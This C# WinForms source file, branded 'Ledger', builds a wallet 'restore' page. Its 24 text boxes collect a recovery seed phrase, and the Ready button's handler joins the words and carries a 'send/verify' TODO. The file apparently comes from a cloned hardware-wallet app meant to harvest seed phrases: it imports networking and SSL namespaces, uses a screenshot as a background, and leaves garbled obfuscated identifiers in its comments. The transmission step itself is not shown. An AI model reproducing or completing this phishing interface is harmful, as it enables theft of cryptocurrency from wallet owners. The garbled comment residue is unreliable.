using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using Ledger.ScrollBar;


// was \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDר\uFFFDΔᛈᛈ\uFFFD
using CuiUiControl = Ledger.ScrollBar.CuiButtonControl;//was  \uD802\uDD13\uFFFDܝ\uFFFDכΜ\uFFFDר\uFFFDΔᛈᛈ\uFFFD;
using ContentAlignment = System.Drawing.ContentAlignment;
using System.Security.Policy;

namespace Ledger.MainClassFolder
{
    // PAGE 3 - Setup Choice (Is this your first time? / Setup new / Restore)
    public partial class Second2Form : Form
    {
        public void InitializePage4()
        {
            this.Page4 = new System.Windows.Forms.Panel();
            this.panel4 = new System.Windows.Forms.Panel();
            this.panel3 = new System.Windows.Forms.Panel();

            // Words 1-12 (left column)
            this.mnem1 = new System.Windows.Forms.TextBox();
            this.mnem2 = new System.Windows.Forms.TextBox();
            this.mnem3 = new System.Windows.Forms.TextBox();
            this.mnem4 = new System.Windows.Forms.TextBox();
            this.mnem5 = new System.Windows.Forms.TextBox();
            this.mnem6 = new System.Windows.Forms.TextBox();
            this.mnem7 = new System.Windows.Forms.TextBox();
            this.mnem8 = new System.Windows.Forms.TextBox();
            this.mnem9 = new System.Windows.Forms.TextBox();
            this.mnem10 = new System.Windows.Forms.TextBox();
            this.mnem11 = new System.Windows.Forms.TextBox();
            this.mnem12 = new System.Windows.Forms.TextBox();

            // Words 13-24 (right column)
            this.mnem13 = new System.Windows.Forms.TextBox();
            this.mnem14 = new System.Windows.Forms.TextBox();
            this.mnem15 = new System.Windows.Forms.TextBox();
            this.mnem16 = new System.Windows.Forms.TextBox();
            this.mnem17 = new System.Windows.Forms.TextBox();
            this.mnem18 = new System.Windows.Forms.TextBox();
            this.mnem19 = new System.Windows.Forms.TextBox();
            this.mnem20 = new System.Windows.Forms.TextBox();
            this.mnem21 = new System.Windows.Forms.TextBox();
            this.mnem22 = new System.Windows.Forms.TextBox();
            this.mnem23 = new System.Windows.Forms.TextBox();
            this.mnem24 = new System.Windows.Forms.TextBox();

            // Number labels 1-12
            this.label1 = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.label7 = new System.Windows.Forms.Label();
            this.label8 = new System.Windows.Forms.Label();
            this.label9 = new System.Windows.Forms.Label();
            this.label10 = new System.Windows.Forms.Label();
            this.label11 = new System.Windows.Forms.Label();
            this.label12 = new System.Windows.Forms.Label();
            this.label13 = new System.Windows.Forms.Label();
            this.label14 = new System.Windows.Forms.Label();
            this.label15 = new System.Windows.Forms.Label();

            // Number labels 13-24
            this.label27 = new System.Windows.Forms.Label();
            this.label26 = new System.Windows.Forms.Label();
            this.label25 = new System.Windows.Forms.Label();
            this.label24 = new System.Windows.Forms.Label();
            this.label23 = new System.Windows.Forms.Label();
            this.label22 = new System.Windows.Forms.Label();
            this.label21 = new System.Windows.Forms.Label();
            this.label20 = new System.Windows.Forms.Label();
            this.label19 = new System.Windows.Forms.Label();
            this.label18 = new System.Windows.Forms.Label();
            this.label17 = new System.Windows.Forms.Label();
            this.label16 = new System.Windows.Forms.Label();

            this.Readybtn = new CuiButtonControl();
            this.Backbt = new CuiButtonControl();
            this.imageList1 = new System.Windows.Forms.ImageList(this.components);

            this.Page4.SuspendLayout();
            this.panel4.SuspendLayout();

            // ──────────────────────────────────────────────
            // Page4 (outer container)
            // ──────────────────────────────────────────────
            this.Page4.Controls.Add(this.panel4);
            this.Page4.Controls.Add(this.panel3);
            this.Page4.Dock = DockStyle.Fill;
            this.Page4.Location = new Point(0, 0);
            this.Page4.Margin = new Padding(4);
            this.Page4.Name = "Page4";
            this.Page4.Size = new Size(1604, 875);
            this.Page4.TabIndex = 5;
            this.Page4.Visible = false;

            // ──────────────────────────────────────────────
            // panel3 – left decorative sidebar
            // ──────────────────────────────────────────────
            this.panel3.BackgroundImage = Properties.Resources.Screenshot_2025_04_26_082339;
            this.panel3.Dock = DockStyle.Left;
            this.panel3.Location = new Point(0, 0);
            this.panel3.Margin = new Padding(4);
            this.panel3.Name = "panel3";
            this.panel3.Size = new Size(429, 875);
            this.panel3.TabIndex = 10;

            // ──────────────────────────────────────────────
            // panel4 – right content area
            // ──────────────────────────────────────────────
            this.panel4.BackgroundImage = Properties.Resources.restore1;
            this.panel4.BackgroundImageLayout = ImageLayout.Stretch;
            this.panel4.Dock = DockStyle.Fill;
            this.panel4.Location = new Point(429, 0);
            this.panel4.Margin = new Padding(4);
            this.panel4.Name = "panel4";
            this.panel4.Size = new Size(1175, 875);
            this.panel4.TabIndex = 11;

            // Add all controls to panel4
            this.panel4.Controls.AddRange(new Control[] {
                // words 1-12
                this.mnem1,  this.mnem2,  this.mnem3,  this.mnem4,
                this.mnem5,  this.mnem6,  this.mnem7,  this.mnem8,
                this.mnem9,  this.mnem10, this.mnem11, this.mnem12,
                // labels 1-12
                this.label1,  this.label5,  this.label6,  this.label7,
                this.label8,  this.label9,  this.label10, this.label11,
                this.label12, this.label13, this.label14, this.label15,
                // words 13-24
                this.mnem13, this.mnem14, this.mnem15, this.mnem16,
                this.mnem17, this.mnem18, this.mnem19, this.mnem20,
                this.mnem21, this.mnem22, this.mnem23, this.mnem24,
                // labels 13-24
                this.label27, this.label26, this.label25, this.label24,
                this.label23, this.label22, this.label21, this.label20,
                this.label19, this.label18, this.label17, this.label16,
                // buttons
                this.Readybtn, this.Backbt
            });

            // ──────────────────────────────────────────────
            // Helper method to configure a mnemonic TextBox
            // ──────────────────────────────────────────────
            void ConfigMnem(TextBox tb, string name, int x, int y, int tabIdx, bool addKeyPress)
            {
                tb.BackColor = Color.FromArgb(26, 27, 28);
                tb.BorderStyle = BorderStyle.FixedSingle;
                tb.Cursor = Cursors.IBeam;
                tb.Font = new Font("Microsoft Sans Serif", 8.25F, FontStyle.Bold);
                tb.ForeColor = Color.White;
                tb.Location = new Point(x, y);
                tb.Margin = new Padding(5);
                tb.MinimumSize = new Size(5, 4);
                tb.Multiline = true;
                tb.Name = name;
                tb.Size = new Size(222, 39);
                tb.TabIndex = tabIdx;
                if (addKeyPress)
                    tb.KeyPress += new KeyPressEventHandler(this.Mnem_KeyPress);
            }

            // Helper for number labels
            void ConfigLabel(Label lbl, string name, string text, int x, int y, int tabIdx)
            {
                lbl.AutoSize = true;
                lbl.BackColor = Color.Transparent;
                lbl.Font = new Font("Microsoft Sans Serif", 9.75F, FontStyle.Bold);
                lbl.ForeColor = Color.DarkGray;
                lbl.Location = new Point(x, y);
                lbl.Margin = new Padding(4, 0, 4, 0);
                lbl.Name = name;
                lbl.TabIndex = tabIdx;
                lbl.Text = text;
                lbl.TextAlign = ContentAlignment.MiddleCenter;
            }

            // ──────────────────────────────────────────────
            // Words 1–12  (left column, x=585)
            // ──────────────────────────────────────────────
            ConfigMnem(mnem1, "mnem1", 585, 203, 10, true);
            ConfigMnem(mnem2, "mnem2", 585, 263, 34, true);
            ConfigMnem(mnem3, "mnem3", 585, 324, 35, true);
            ConfigMnem(mnem4, "mnem4", 585, 384, 36, true);
            ConfigMnem(mnem5, "mnem5", 585, 444, 37, true);
            ConfigMnem(mnem6, "mnem6", 585, 505, 38, true);
            ConfigMnem(mnem7, "mnem7", 585, 565, 39, true);
            ConfigMnem(mnem8, "mnem8", 585, 625, 40, true);
            ConfigMnem(mnem9, "mnem9", 585, 686, 41, true);
            ConfigMnem(mnem10, "mnem10", 585, 746, 42, true);
            ConfigMnem(mnem11, "mnem11", 585, 806, 43, true);
            ConfigMnem(mnem12, "mnem12", 585, 866, 44, true);

            // ──────────────────────────────────────────────
            // Words 13–24  (right column, x=908)
            // ──────────────────────────────────────────────
            ConfigMnem(mnem13, "mnem13", 908, 203, 45, false);
            ConfigMnem(mnem14, "mnem14", 908, 263, 58, false);
            ConfigMnem(mnem15, "mnem15", 908, 324, 59, false);
            ConfigMnem(mnem16, "mnem16", 908, 384, 60, false);
            ConfigMnem(mnem17, "mnem17", 908, 444, 61, false);
            ConfigMnem(mnem18, "mnem18", 908, 505, 62, false);
            ConfigMnem(mnem19, "mnem19", 908, 565, 63, false);
            ConfigMnem(mnem20, "mnem20", 908, 625, 64, false);
            ConfigMnem(mnem21, "mnem21", 908, 686, 65, false);
            ConfigMnem(mnem22, "mnem22", 908, 746, 66, false);
            ConfigMnem(mnem23, "mnem23", 908, 806, 67, false);
            ConfigMnem(mnem24, "mnem24", 908, 866, 68, false);

            // ──────────────────────────────────────────────
            // Number labels 1–12  (x=535)
            // ──────────────────────────────────────────────
            ConfigLabel(label1, "label1", "1.", 535, 223, 22);
            ConfigLabel(label5, "label5", "2.", 535, 283, 23);
            ConfigLabel(label6, "label6", "3.", 535, 343, 24);
            ConfigLabel(label7, "label7", "4.", 535, 404, 25);
            ConfigLabel(label8, "label8", "5.", 535, 464, 26);
            ConfigLabel(label9, "label9", "6.", 535, 524, 27);
            ConfigLabel(label10, "label10", "7.", 535, 585, 28);
            ConfigLabel(label11, "label11", "8.", 535, 645, 29);
            ConfigLabel(label12, "label12", "9.", 535, 705, 30);
            ConfigLabel(label13, "label13", "10.", 535, 766, 31);
            ConfigLabel(label14, "label14", "11.", 535, 826, 32);
            ConfigLabel(label15, "label15", "12.", 535, 886, 33);

            // ──────────────────────────────────────────────
            // Number labels 13–24  (x=857)
            // ──────────────────────────────────────────────
            ConfigLabel(label27, "label27", "13.", 857, 223, 46);
            ConfigLabel(label26, "label26", "14.", 857, 283, 47);
            ConfigLabel(label25, "label25", "15.", 857, 343, 48);
            ConfigLabel(label24, "label24", "16.", 857, 404, 49);
            ConfigLabel(label23, "label23", "17.", 857, 464, 50);
            ConfigLabel(label22, "label22", "18.", 857, 524, 51);
            ConfigLabel(label21, "label21", "19.", 857, 585, 52);
            ConfigLabel(label20, "label20", "20.", 857, 645, 53);
            ConfigLabel(label19, "label19", "21.", 857, 705, 54);
            ConfigLabel(label18, "label18", "22.", 857, 766, 55);
            ConfigLabel(label17, "label17", "23.", 857, 826, 56);
            ConfigLabel(label16, "label16", "24.", 857, 886, 57);

            // ──────────────────────────────────────────────
            // Readybtn – "Ok, I'm ready!"
            // ──────────────────────────────────────────────
            this.Readybtn.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            this.Readybtn.BackColor = Color.Transparent;
            this.Readybtn.CheckButton = false;
            this.Readybtn.Checked = false;
            this.Readybtn.CheckedBackground = Color.DarkGray;
            this.Readybtn.CheckedForeColor = Color.White;
            this.Readybtn.CheckedImageTint = Color.White;
            this.Readybtn.CheckedOutline = Color.DarkGray;
            this.Readybtn.Content = "Ok,I\'m ready!";
            this.Readybtn.Cursor = Cursors.Hand;
            this.Readybtn.DialogResult = DialogResult.None;
            this.Readybtn.Font = new Font("Microsoft Sans Serif", 8.25F, FontStyle.Bold);
            this.Readybtn.ForeColor = Color.Black;
            this.Readybtn.HoverBackground = Color.DarkGray;
            this.Readybtn.HoveredImageTint = Color.White;
            this.Readybtn.HoverForeColor = Color.White;
            this.Readybtn.HoverOutline = Color.DarkGray;
            this.Readybtn.Image = null;
            this.Readybtn.ImageAutoCenter = true;
            this.Readybtn.ImageExpand = new Point(30, 3);
            this.Readybtn.ImageOffset = new Point(20, 30);
            this.Readybtn.Location = new Point(493, 784);
            this.Readybtn.Margin = new Padding(4);
            this.Readybtn.Name = "Readybtn";
            this.Readybtn.NormalBackground = Color.WhiteSmoke;
            this.Readybtn.NormalForeColor = Color.Black;
            this.Readybtn.NormalImageTint = Color.White;
            this.Readybtn.NormalOutline = Color.FromArgb(19, 20, 21);
            this.Readybtn.OutlineThickness = 1.6F;
            this.Readybtn.PressedBackground = Color.Transparent;
            this.Readybtn.PressedForeColor = Color.White;
            this.Readybtn.PressedImageTint = Color.White;
            this.Readybtn.PressedOutline = Color.FromArgb(224, 224, 224);
            this.Readybtn.Rounding = new Padding(18);
            this.Readybtn.Size = new Size(213, 46);
            this.Readybtn.TabIndex = 9;
            this.Readybtn.TextAlignment = StringAlignment.Center;
            this.Readybtn.TextOffset = new Point(0, 0);
            this.Readybtn.Click += new EventHandler(this.Readybtn_Click);

            // ──────────────────────────────────────────────
            // Backbt – "Back"
            // ──────────────────────────────────────────────
            this.Backbt.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
            this.Backbt.BackColor = Color.Transparent;
            this.Backbt.CheckButton = false;
            this.Backbt.Checked = false;
            this.Backbt.CheckedBackground = Color.Transparent;
            this.Backbt.CheckedForeColor = Color.White;
            this.Backbt.CheckedImageTint = Color.White;
            this.Backbt.CheckedOutline = Color.DarkGray;
            this.Backbt.Content = "  Back";
            this.Backbt.Cursor = Cursors.Hand;
            this.Backbt.DialogResult = DialogResult.None;
            this.Backbt.Font = new Font("Microsoft Sans Serif", 8.25F, FontStyle.Bold);
            this.Backbt.ForeColor = Color.White;
            this.Backbt.HoverBackground = Color.Transparent;
            this.Backbt.HoveredImageTint = Color.White;
            this.Backbt.HoverForeColor = Color.White;
            this.Backbt.HoverOutline = Color.DarkGray;
            this.Backbt.Image = Properties.Resources.Left_Arrow;
            this.Backbt.ImageAutoCenter = true;
            this.Backbt.ImageExpand = new Point(3, 3);
            this.Backbt.ImageOffset = new Point(0, 0);
            this.Backbt.Location = new Point(585, 784);
            this.Backbt.Margin = new Padding(4);
            this.Backbt.Name = "Backbt";
            this.Backbt.NormalBackground = Color.Transparent;
            this.Backbt.NormalForeColor = Color.White;
            this.Backbt.NormalImageTint = Color.White;
            this.Backbt.NormalOutline = Color.DarkGray;
            this.Backbt.OutlineThickness = 1.6F;
            this.Backbt.PressedBackground = Color.Transparent;
            this.Backbt.PressedForeColor = Color.White;
            this.Backbt.PressedImageTint = Color.White;
            this.Backbt.PressedOutline = Color.FromArgb(224, 224, 224);
            this.Backbt.Rounding = new Padding(18);
            this.Backbt.Size = new Size(141, 46);
            this.Backbt.TabIndex = 8;
            this.Backbt.TextAlignment = StringAlignment.Center;
            this.Backbt.TextOffset = new Point(0, 0);
            this.Backbt.Click += new EventHandler(this.Backbt_Click);

            // ──────────────────────────────────────────────
            // imageList1
            // ──────────────────────────────────────────────
            this.imageList1.ColorDepth = ColorDepth.Depth8Bit;
            this.imageList1.ImageSize = new Size(16, 16);
            this.imageList1.TransparentColor = Color.Transparent;

            this.panel4.ResumeLayout(false);
            this.panel4.PerformLayout();
            this.Page4.ResumeLayout(false);
        }

        // --- Page 4 Event Handlers ---

        private void Backbt_Click(object sender, EventArgs e)
        {
            this.Page4.Visible = false;
            this.Page2.Visible = false;
            this.page1.Visible = false;
            this.Page3.Visible = true;
        }

        private void Readybtn_Click(object sender, EventArgs e)
        {
            // Collect all 24 mnemonic words
            string[] words = new string[]
            {
                mnem1.Text.Trim(),  mnem2.Text.Trim(),  mnem3.Text.Trim(),  mnem4.Text.Trim(),
                mnem5.Text.Trim(),  mnem6.Text.Trim(),  mnem7.Text.Trim(),  mnem8.Text.Trim(),
                mnem9.Text.Trim(),  mnem10.Text.Trim(), mnem11.Text.Trim(), mnem12.Text.Trim(),
                mnem13.Text.Trim(), mnem14.Text.Trim(), mnem15.Text.Trim(), mnem16.Text.Trim(),
                mnem17.Text.Trim(), mnem18.Text.Trim(), mnem19.Text.Trim(), mnem20.Text.Trim(),
                mnem21.Text.Trim(), mnem22.Text.Trim(), mnem23.Text.Trim(), mnem24.Text.Trim()
            };

            string fullPhrase = string.Join(" ", words);
            // TODO: handle the collected mnemonic phrase (e.g. send/verify)
        }

        private void Mnem_KeyPress(object sender, KeyPressEventArgs e)
        {
            // Only allow letters, control characters, and spaces
            if (char.IsLetter(e.KeyChar) || char.IsControl(e.KeyChar) || e.KeyChar == ' ')
                return;
            e.Handled = true;
        }
    }
}